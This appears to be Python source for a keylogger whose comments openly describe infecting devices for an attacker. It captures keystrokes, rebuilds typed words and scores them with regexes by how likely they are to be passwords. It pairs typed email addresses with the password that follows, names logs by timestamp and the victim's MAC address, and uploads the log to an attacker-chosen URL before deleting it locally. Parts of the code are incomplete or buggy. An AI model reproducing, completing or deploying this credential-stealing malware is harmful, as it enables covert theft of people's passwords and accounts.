import keyboard
import os
import re
from typing import IO
import requests
import uuid
import time

#Create a filename based off the current timestamp and the infected device's MAC address
#The name is in the format timestamp MAC address
#This allows the attacker to identify each infected and each uploaded file per infected
def generate_file_name()-> str:
    time_stamp = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
    return str(time_stamp+" "+str(uuid.getnode()))

def create_logged_keys_file(path:str, file_name:str)->IO:
    file_path = os.path.join(path, file_name)
    return os.open(file_path, "a")

def word_priority_predictor(word:str)->int:
    #Matches any string that is 8 characters or more, as most passwords usually are
    length_regex = re.compile(r'^.{8,}$')
    #Matches any string that includes a mix of uppercase and lowercase letters, numbers, and special characters, which is usually a password requirement
    special_char_regex = re.compile(r'^(?=.*?[A-Z])(?=.*?[a-z])(?=.*?[0-9])(?=.*?[#?!@$%^&*-])\S+$')

    if length_regex.match(word):
        if special_char_regex.match(word):
            return 0
        else:
            return 1
    return 2

def read_word_being_typed():
    word:str = ""
    def closure(event: keyboard.KeyboardEvent):
        nonlocal word #To create a closure
        if event.name == "enter" or event.name == "space":
            return word, word_priority_predictor(word)
        elif event.name == "backspace":
            word = word[:-1] if word else "" #To avoid an IndexError for cases where the string is empty
        else:
            #If only one character was entered, to avoid saving keyboard events like tab, ctrl etc
            if len(event.name)==1:
                word+=event.name
            return False
    return closure

def email_check(word: str):
    email_regex = re.compile('^[\w+\-.]+@[a-z\d\-]+(\.[a-z\d\-]+)*\.[a-z]+$')
    return email_regex.match(word)



def update_logged_keys_file(word: str, priority: int, file: IO):
    #If the word is an email then we dont add a newspace character cause it's likely the password will come after it, and also we want the emails to have the same priority as their corresponding password
    file.write("email: "+ word +" password: ") if email_check(word) else file.write(word+" "+str(priority)+"\n") 

#Upload the file to whatever site the attacker wants then delete it
def upload(file_path:str, file_name:str, url:str, token:str)->bool:
    with open(file_path, "rb") as f:
        file = {"file": (file_name, f)}
        response = requests.post(url=url+token, files=file)
    os.unlink(file_path)
    return response.json()["status"]


    

